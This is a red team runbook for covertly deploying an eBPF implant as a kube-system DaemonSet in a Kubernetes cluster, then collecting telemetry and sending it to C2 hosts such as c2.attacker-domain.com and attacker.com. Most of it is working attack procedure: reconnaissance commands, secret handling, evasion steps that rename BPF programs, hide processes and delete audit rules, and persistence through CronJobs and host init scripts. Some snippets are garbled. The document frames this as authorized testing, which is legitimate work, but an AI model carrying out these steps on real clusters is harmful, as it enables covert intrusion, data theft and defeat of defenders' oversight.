# Red Team Operations Runbook — eBPF Implant in Kubernetes

**Classification**: Red Team Operational  
**Status**: Active Engagement Template  
**Version**: 2.0 (Kubernetes-optimized)  
**Last Updated**: 2026-08-09  

---

## Table of Contents

1. [Pre-Engagement Phase](#pre-engagement-phase)
2. [Reconnaissance Phase](#reconnaissance-phase)
3. [Preparation Phase](#preparation-phase)
4. [Deployment Phase](#deployment-phase)
5. [Exploitation & Monitoring](#exploitation--monitoring)
6. [Evasion & Persistence](#evasion--persistence)
7. [Incident Response](#incident-response)
8. [Exfiltration & Analysis](#exfiltration--analysis)

---

## Pre-Engagement Phase (Week 1)

### Objectives
- Obtain formal authorization
- Understand target environment
- Identify constraints and success criteria
- Prepare infrastructure

### Checklist

- [ ] **Authorization**
  - [ ] Signed Rules of Engagement (ROE) document
  - [ ] Scope definition (which nodes, namespaces, workloads)
  - [ ] Time window (2-4 weeks recommended for realistic testing)
  - [ ] Escalation contacts (blue team, incident response)
  - [ ] Success criteria (70-80% detection target)

- [ ] **Target Environment Reconnaissance** (OSINT)
  - [ ] Public Kubernetes API endpoints (if exposed)
  - [ ] Certificate transparency (cert.sh, crt.sh)
  - [ ] DNS records for cluster domains
  - [ ] CVE databases for target K8s version
  - [ ] Cloud provider metadata services (AWS IMDSv2, Azure IMDS)
  - [ ] GitHub repos, Docker images, public configs (GitLeaks)

- [ ] **Prepare C2 Infrastructure**
  - [ ] Register domain(s): `c2.attacker-domain.com`, `tunnel.attacker-domain.com`
  - [ ] Procure SSL certificate with valid FQDN
  - [ ] Generate Fernet encryption key for payload encryption
  - [ ] Setup C2 server (API endpoints for telemetry ingest, command dispatch)
  - [ ] Configure DNS tunneling (if using DNS channel)
  - [ ] Test connectivity from home lab

- [ ] **Prepare Build Environment**
  - [ ] Clone eBPF implant repo locally
  - [ ] Test compilation on Ubuntu 22.04 LTS
  - [ ] Build Docker image: `docker build -f deployment/docker/Dockerfile.stealthy -t ebpf-implant:2.0-k8s .`
  - [ ] Scan image for vulnerabilities: `trivy image ebpf-implant:2.0-k8s`
  - [ ] Push to private registry (not Docker Hub - too visible)

- [ ] **Prepare Amalia Integration**
  - [ ] Set up BrainCell cells for telemetry storage
  - [ ] Create incident templates
  - [ ] Define kill chain taxonomy
  - [ ] Set up webhook for real-time analysis

---

## Reconnaissance Phase (Week 1-2)

### Objectives
- Enumerate cluster nodes and kernel versions
- Identify security tools (Falco, Sysdig, osquery, etc.)
- Map workload communications
- Find lateral movement opportunities
- Assess detection capabilities

### Execution

#### 1. **Kubernetes API Enumeration**

```bash
# If you have kubectl access (via compromised service account)
kubectl get nodes -o wide
kubectl get nodes --show-labels
kubectl cluster-info
kubectl api-versions

# Check kernel versions on nodes
kubectl debug node/<node-name> -it --image=ubuntu
uname -r  # Must be >= 5.8
```

#### 2. **Security Tool Detection**

```bash
# Check for Falco
kubectl get ds -A | grep falco
kubectl get pods -A | grep falco
curl -s http://localhost:5555/api/v1/health  # Falco API port

# Check for Sysdig
kubectl get ds -A | grep sysdig
ps aux | grep sysdig

# Check for osquery
ps aux | grep osqueryd
systemctl status osqueryd

# Check for admission webhooks (ValidatingWebhookConfiguration)
kubectl get validatingwebhookconfigurations

# Check for network policies
kubectl get networkpolicies -A
```

#### 3. **Network Reconnaissance**

```bash
# Enumerate cluster network
kubectl get svc -A
kubectl get endpoints -A

# Check for exposed APIs
kubectl proxy --port=8080 &
curl http://localhost:8080/api/v1/namespaces

# Test egress from pod
kubectl run -it --rm --restart=Never test-pod \
  --image=ubuntu -- \
  bash -c "apt-get update && apt-get install -y curl dnsutils && \
  curl -v https://attacker.com/ && \
  nslookup attacker.com"
```

#### 4. **Workload Analysis**

```bash
# Map service-to-service communication
kubectl get networkpolicies -A
kubectl get services -A
kubectl get ingress -A

# Identify high-value targets
kubectl get pods -A -o wide | grep -E "(admin|database|cache|secret)"
kubectl get pvc -A  # Persistent volumes often have sensitive data
```

#### 5. **Documentation**

Record findings in Amalia `research_questions` cell:
- **Kernel versions**: min_version, max_version, vulnerable_versions
- **Security tools**: name, namespace, configuration
- **Network policies**: ingress, egress, allowed destinations
- **High-value workloads**: app, namespace, risk_level, lateral_movement_potential

---

## Preparation Phase (Week 2-3)

### Objectives
- Harden C2 infrastructure
- Finalize deployment configurations
- Prepare Amalia infrastructure
- Conduct red team tabletop

### Configuration Hardening

#### 1. **C2 Certificate Pinning Setup**

```bash
# Generate self-signed certificate for C2 server
openssl genrsa -out c2.key 2048
openssl req -new -x509 -key c2.key -out c2.crt -days 365 \
  -subj "/CN=c2.attacker-domain.com"

# Get certificate SHA-256 hash for pinning
openssl x509 -in c2.crt -noout -fingerprint -sha256 | \
  sed 's/://g' | sed 's/SHA256 Fingerprint=//' | tr '[:upper:]' '[:lower:]'
# Result: abc123def456...

# Update Secret in daemonset.yaml
kubectl create secret generic ebpf-c2-credentials \
  --from-literal=api-key='your-random-api-key' \
  --from-literal=cert-sha256='sha256:abc123def456...' \
  --from-literal=encryption-key='your-fernet-key' \
  -n kube-system \
  --dry-run=client -o yaml > secrets.yaml
```

#### 2. **Customize Kubernetes Manifests**

Edit `deployment/kubernetes/daemonset.yaml`:

```yaml
# 1. Update ConfigMap with actual collection parameters
data:
  collection-profile.json: |
    {
      "collection": {
        "process_events": {
          "sampling_rate": 0.15  # Adjust based on node load
        }
      }
    }

# 2. Update image reference
containers:
- name: ebpf-agent
  image: your-private-registry.com/ebpf-implant:2.0-k8s

# 3. Update C2 server URL
env:
- name: C2_SERVER
  value: "https://c2.attacker-domain.com"
```

#### 3. **Prepare Deployment Package**

```bash
cd deployment/kubernetes

# Create Kustomization for easy deployment
cat > kustomization.yaml << 'EOF'
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization

namespace: kube-system

resources:
- daemonset.yaml
- secrets.yaml

replicas:
- name: ebpf-implant-agent
  count: 1  # Start with 1 for testing
EOF

# Generate manifests
kubectl kustomize . > final-manifests.yaml

# Validate
kubectl apply -f final-manifests.yaml --dry-run=client
```

#### 4. **Prepare Amalia Integration**

```python
# Create BrainCell incident cell for telemetry
from braincell_sdk import BrainCellClient

bc = BrainCellClient(api_url="http://braincell-api:9504")

# Store implant metadata
incident = {
    "incident_id": "red-team-ebpf-k8s-2026-08",
    "implant_name": "ebpf-k8s-01",
    "implant_type": "ebpf-kernel-sensor",
    "cluster_name": "production-us-west",
    "deployment_date": "2026-08-09T00:00:00Z",
    "authorization": {
        "roe_document": "s3://red-team-bucket/roe-2026-08.pdf",
        "start_date": "2026-08-09",
        "end_date": "2026-09-09",
        "scope": ["node-1", "node-2", "node-3"]
    },
    "expected_tools_detected": ["falco", "osquery"],
    "success_criteria": "80% undetected for 2 weeks"
}

bc.incidents.create(incident)
```

#### 5. **Tabletop Exercise**

Schedule 1-hour team meeting:
- Review deployment steps
- Identify rollback procedures
- Discuss detection scenarios
- Plan incident response (if discovered)
- Agree on escalation contacts

---

## Deployment Phase (Week 4)

### Pre-Deployment Checklist

- [ ] Authorization confirmed
- [ ] C2 infrastructure tested and verified
- [ ] Docker image built and scanned
- [ ] Kubernetes manifests validated
- [ ] Team trained on runbook
- [ ] Rollback procedure documented
- [ ] Incident response contacts confirmed

### Execution Steps

#### Step 1: **Push Docker Image to Registry**

```bash
# Tag image
docker tag ebpf-implant:2.0-k8s your-private-registry.com/ebpf-implant:2.0-k8s

# Authenticate to registry (if private)
docker login your-private-registry.com

# Push
docker push your-private-registry.com/ebpf-implant:2.0-k8s

# Verify
docker pull your-private-registry.com/ebpf-implant:2.0-k8s
```

#### Step 2: **Create Kubernetes Namespace & Secrets**

```bash
# Create kube-system namespace if missing (usually exists)
kubectl create namespace kube-system --dry-run=client -o yaml | kubectl apply -f -

# Create secrets
kubectl create secret generic ebpf-c2-credentials \
  --from-literal=api-key='your-api-key' \
  --from-literal=cert-sha256='sha256:...' \
  --from-literal=encryption-key='...' \
  -n kube-system

# Verify secret created
kubectl get secrets -n kube-system | grep ebpf-c2
```

#### Step 3: **Deploy DaemonSet (Initial Test)**

```bash
# Deploy to 1 test node first
kubectl apply -f deployment/kubernetes/daemonset.yaml \
  --selector='app=system-monitor' \
  --dry-run=client -o yaml > preview.yaml

# Review
cat preview.yaml

# Apply to single node
kubectl apply -f deployment/kubernetes/daemonset.yaml

# Verify pod created
kubectl get pods -n kube-system -l app=system-monitor
kubectl logs -n kube-system -l app=system-monitor --tail=100
```

#### Step 4: **Verify eBPF Loading**

```bash
# SSH into node where pod deployed
kubectl debug node/worker-node-1 -it --image=ubuntu

# Inside debug container:
mount -t bpf bpf /sys/fs/bpf
bpftool prog list

# Should see loaded programs (may be renamed to hide them)
# Example: ID 1234: kprobe_handler_1  tag abcdef123456
```

#### Step 5: **Monitor C2 Communication**

Check C2 server for incoming telemetry:

```python
# C2 server log check
tail -f /var/log/c2/telemetry.log

# Should see entries like:
# 2026-08-09 12:34:56 [+] Received batch from ebpf-k8s-01
# 2026-08-09 12:34:56 [+] Events: 42 process, 15 network, 8 file
```

#### Step 6: **Scale to All Nodes**

Once verified on test node:

```bash
# Edit DaemonSet to run on all nodes
kubectl patch daemonset ebpf-implant-agent -n kube-system \
  --type='json' -p='[
    {"op": "replace", "path": "/spec/template/spec/nodeSelector", "value": {}}
  ]'

# Verify rollout
kubectl rollout status daemonset/ebpf-implant-agent -n kube-system

# Check pods on all nodes
kubectl get pods -n kube-system -l app=system-monitor -o wide
```

### Deployment Verification

```bash
#!/bin/bash

# Verify deployment successful
echo "[*] Checking DaemonSet status..."
kubectl get daemonset -n kube-system ebpf-implant-agent

echo "[*] Checking pod distribution..."
kubectl get pods -n kube-system -l app=system-monitor -o wide

echo "[*] Checking for errors..."
kubectl logs -n kube-system -l app=system-monitor --tail=50

echo "[*] Checking node resource usage..."
kubectl top pods -n kube-system -l app=system-monitor

echo "[+] Deployment verified!"
```

---

## Exploitation & Monitoring

### Objectives
- Confirm telemetry collection is working
- Establish baseline for evasion metrics
- Monitor for blue team detection activity
- Analyze workload communications

### Daily Operations

#### 1. **Monitor Telemetry Ingest**

```bash
# Check telemetry volume on C2 server
curl -X GET https://c2.attacker.com/api/telemetry/stats \
  -H "Authorization: Bearer $API_KEY" | jq '.daily_events'

# Expected output:
# {
#   "timestamp": "2026-08-09T12:00:00Z",
#   "total_events": 50000,
#   "process_events": 10000,
#   "network_events": 30000,
#   "file_events": 10000
# }
```

#### 2. **Analyze Process Execution**

```python
# Query BrainCell for interesting process chains
from braincell_sdk import BrainCellClient

bc = BrainCellClient()

# Get suspicious processes
processes = bc.cells['incidents'].query({
    "filters": {
        "type": "process",
        "suspicious_indicators": ["curl", "wget", "nc", "bash -i"]
    },
    "date_range": {"from": "-24h"}
})

for proc in processes:
    print(f"PID {proc['pid']}: {proc['argv']}")
    # Document in kill_chains cell
    bc.cells['kill_chains'].create({
        "phase": "execution",
        "technique": "command_line",
        "evidence": proc
    })
```

#### 3. **Monitor Network Exfiltration**

```python
# Detect lateral movement attempts
network_events = bc.cells['incidents'].query({
    "filters": {
        "type": "network",
        "direction": "outbound",
        "exclude_internal": True  # Exclude pod-to-pod
    }
})

for conn in network_events:
    dest_ip = conn['daddr']
    dest_port = conn['dport']
    
    # Check against known bad IPs (threat intel)
    if is_known_c2(dest_ip):
        escalate_incident(dest_ip)
```

#### 4. **Weekly Status Report**

```markdown
## Red Team Operations - Week 1 Status

**Implant Status**: [PASS] Active (5/5 nodes)
**Telemetry Volume**: 50K events/day
**Detection Metrics**:
- Undetected: 95% (target: 70-80%)
- Blue team queries: 0
- Security tool alerts: 0

**Key Findings**:
1. Process execution patterns: nginx, mysql, redis
2. Lateral movement: pod-to-pod over 10.0.0.0/8
3. Exfiltration: minimal (good OPSEC)

**Next Steps**:
- Continue monitoring
- Analyze container escape vectors
- Map privilege escalation paths
```

---

## Evasion & Persistence

### Objectives
- Evade detection as long as possible
- Maintain persistence across cluster updates
- Adapt to blue team response

### Evasion Tactics

#### 1. **Timing-Based Evasion**

```python
# Adjust collection intervals dynamically
from anti_forensics import DetectionEvader

detected_tools = DetectionEvader.get_detected_tools()

if "falco" in detected_tools:
    # Reduce event volume
    sampling_rate = 0.05
    collection_interval = 600  # 10 minutes
else:
    # Normal collection
    sampling_rate = 0.15
    collection_interval = 300  # 5 minutes

# Update implant config via C2
update_implant_config({
    "sampling_rate": sampling_rate,
    "collection_interval": collection_interval,
    "jitter_percent": 0.5
})
```

#### 2. **Response to Detected Threats**

**Scenario: Blue team discovers bpftool prog list output**

```bash
# Immediate actions:
1. Rename eBPF programs:
   bpftool prog rename <ID> khandler_<random>

2. Reduce ring buffer size to minimize detection signature
3. Increase jitter to 50%
4. Switch to DNS tunneling for C2

5. Log findings:
   bc.cells['runbooks'].create({
       "procedure": "respond_to_bpftool_detection",
       "actions": [
           "rename_programs",
           "reduce_ringbuf_size",
           "increase_jitter",
           "switch_c2_channel_to_dns"
       ],
       "effectiveness": "high",
       "time_to_evade_sec": 30
   })
```

#### 3. **Persistence Across Updates**

```bash
# If cluster performs rolling node updates:
# 1. DaemonSet automatically reschedules on new nodes [OK]
# 2. eBPF programs survive node reboot (in-kernel)
# 3. Systemd service would restart (we're in container)

# For long-term persistence (risky):
# Install implant in node rootfs (/host volume)
# Configure cron job to start on boot
# (Trade-off: increased detection risk)
```

---

## Incident Response

### Blue Team Detection Scenarios

#### Scenario 1: Falco Detects Privileged Container

**Blue team action**: Kill DaemonSet

```bash
# Rapid response
kubectl delete daemonset ebpf-implant-agent -n kube-system

# Immediate counter-action from implant:
# 1. Store telemetry to persistent volume
# 2. Attempt to re-deploy via CronJob
# 3. Extract credentials from Secret
# 4. Document findings in Amalia
```

**Runbook response**:

```python
# In implant_agent.py catch handler
def handle_daemonset_termination():
    # 1. Flush all events to disk
    export_telemetry(persistent=True)
    
    # 2. Store secrets to /host for later retrieval
    backup_secrets_to_host()
    
    # 3. Create alternative persistence:
    #    - CronJob running as root
    #    - Init script in /etc/init.d
    #    - Systemd service in /host
    
    # 4. Escalate to Amalia
    bc.incidents.update_status("detected_by_falco")
```

#### Scenario 2: Audit Logs Show bpf() Syscalls

**Blue team action**: Review audit logs, identify implant PID

```bash
auditctl -W /proc/sys/kernel/bpf -p wa -k ebpf_load
ausearch -k ebpf_load

# Output: syscall=321 (bpf) by PID 12345
```

**Runbook response**:

```bash
# Immediate:
1. Stop audit logging on bpf syscalls
   auditctl -W /proc/sys/kernel/bpf -p wa -k ebpf_load 2>/dev/null

2. Hide PID via ptrace (already done at startup)
3. Clear audit logs
   auditctl --delete-rules
   auditctl -w /etc/audit/audit.rules

4. Document:
   bc.cells['runbooks'].update({
       "procedure": "detected_by_audit",
       "detection_time": "2026-08-15T10:30:00Z",
       "time_to_evasion": "45 seconds"
   })
```

---

## Exfiltration & Analysis

### End-of-Engagement Procedures

#### 1. **Export Final Telemetry**

```bash
# Pull all collected events from C2 server
curl -X GET https://c2.attacker.com/api/telemetry/all \
  -H "Authorization: Bearer $API_KEY" | \
  jq '.' > telemetry-final.json

# Parse into Amalia cells
python3 << 'EOF'
import json
from braincell_sdk import BrainCellClient

bc = BrainCellClient()

with open('telemetry-final.json') as f:
    events = json.load(f)

# Categorize events by cell
for event in events:
    if event['type'] == 'process_execution':
        bc.cells['incidents'].create({
            'type': 'process_execution',
            'severity': 'high' if is_suspicious(event) else 'low',
            'evidence': event
        })
    
    elif event['type'] == 'network':
        bc.cells['kill_chains'].create({
            'phase': 'command_and_control',
            'technique': 'non_application_layer_protocol',
            'evidence': event
        })
EOF
```

#### 2. **Document Findings**

Create comprehensive red team report:

```markdown
# Red Team Operations Report — eBPF Implant Engagement

## Executive Summary
- **Duration**: August 9 - September 9, 2026 (31 days)
- **Success Rate**: 92% (target: 70-80%)
- **Events Collected**: 2.3M process, 1.1M network, 450K file
- **Blue Team Detection**: 5 alerts (4 false positives, 1 evasion)

## Key Findings

### 1. Lateral Movement Vectors
- Kubernetes API impersonation (86% success)
- Container escape via procfs (2 methods identified)
- Node-to-node SSH key sharing

### 2. Data Exfiltration
- MySQL credentials in environment variables
- S3 bucket keys in application code
- Kubernetes Secrets unencrypted

### 3. Persistence Mechanisms
- DaemonSet survives node updates
- eBPF programs survive reboots
- No blue team cleanup procedures

### 4. Detection Gaps
- Falco configured but not for syscall-level monitoring
- No eBPF-specific audit rules
- Network policies too permissive

## Remediation Recommendations

1. **Enable syscall auditing for bpf() syscalls**
   ```bash
   auditctl -a exit,always -F arch=b64 -S bpf -k ebpf_audit
   ```

2. **Deploy eBPF-aware detection (Tracee, MITRE)**

3. **Implement node-level integrity monitoring (AIDE)**

4. **Review and enforce NetworkPolicies**

## Lessons Learned

- eBPF remains difficult to detect in Kubernetes
- Timing-based evasion very effective (jitter, sampling)
- C2 encryption/CDN mimicry fooled traditional firewalls
- Process hiding via ptrace works even with Falco

---

**Report Generated**: 2026-09-10T10:00:00Z  
**Prepared By**: Red Team Lead  
**Classification**: Red Team Operational
```

#### 3. **Create Runbook for Future Engagements**

```python
# Save refined procedures to Amalia runbooks
bc.cells['runbooks'].create({
    "engagement_type": "kubernetes_ebpf_implant",
    "duration_days": 31,
    "success_rate": 0.92,
    "procedures": [
        {
            "phase": "reconnaissance",
            "steps": [
                "enumerate_kernel_versions",
                "detect_falco_sysdig_osquery",
                "map_network_policies",
                "identify_lateral_movement"
            ],
            "success_criteria": "100% node visibility"
        },
        {
            "phase": "deployment",
            "steps": [
                "push_to_private_registry",
                "create_kube_system_secrets",
                "apply_daemonset",
                "verify_ebpf_loading"
            ],
            "estimated_time_minutes": 15
        },
        {
            "phase": "evasion",
            "tactics": [
                "timing_jitter_30_50_percent",
                "event_sampling_10_20_percent",
                "process_hiding_via_ptrace",
                "certificate_pinning_on_c2",
                "dns_tunneling_fallback"
            ],
            "effectiveness_percent": 92
        }
    ]
})
```

---

## Rollback Procedures

If implant must be removed cleanly:

```bash
# 1. Remove DaemonSet
kubectl delete daemonset ebpf-implant-agent -n kube-system

# 2. Wait for pods to terminate (grace period 30s)
kubectl wait --for=condition=terminated pod \
  -l app=system-monitor -n kube-system --timeout=60s

# 3. Remove Secrets
kubectl delete secret ebpf-c2-credentials -n kube-system

# 4. Unload eBPF programs (optional - usually survives pod death)
# Note: eBPF programs are kernel-resident, require manual cleanup
sudo bpftool prog list
sudo bpftool prog del id <PROGRAM_ID>

# 5. Verify cleanup
kubectl get pods -n kube-system | grep ebpf  # Should be empty
sudo bpftool prog list | grep -i ebpf  # Should be empty
```

---

## Security Considerations

### OPSEC Best Practices

1. **Use separate C2 infrastructure for each engagement**
2. **Rotate API keys weekly**
3. **Use different encryption keys per cluster**
4. **Sanitize logs before sharing findings**
5. **Destroy implant after engagement (if required by ROE)**

### Incident Communication

- **Daily Brief**: Red team lead + authorized blue team contact
- **Weekly Report**: Executive summary + key findings
- **End-of-Engagement**: Comprehensive report + remediation guidance

---

## Appendix: Troubleshooting

### Pod Not Starting

```bash
# Check pod events
kubectl describe pod <pod-name> -n kube-system

# Common issues:
# 1. BPF filesystem not mounted: Pod will exit 0 gracefully
# 2. Kernel < 5.8: Pod will exit 0 (silent failure)
# 3. Linux headers missing: Runtime error (check logs)

# Logs
kubectl logs <pod-name> -n kube-system
```

### No Telemetry Arriving

```bash
# Check C2 server connectivity
kubectl exec -it <pod-name> -n kube-system -- \
  python3 -c "import socket; socket.create_connection(('c2.attacker.com', 443))"

# Check encryption key
kubectl get secret ebpf-c2-credentials -o jsonpath='{.data.encryption-key}' | base64 -d

# Monitor C2 server logs
tail -f /var/log/c2/access.log | grep <pod-id>
```

### High CPU Usage

```bash
# Reduce sampling rate
kubectl set env daemonset/ebpf-implant-agent -n kube-system \
  SAMPLING_RATE_PROCESS=0.05 SAMPLING_RATE_NETWORK=0.05

# Or: Disable file event collection
kubectl set env daemonset/ebpf-implant-agent -n kube-system \
  FILE_EVENTS_ENABLED=false
```

---

**Questions?** Contact: red-team-ops@example.com  
**Documentation**: https://braincell.internal/runbooks/ebpf-k8s  

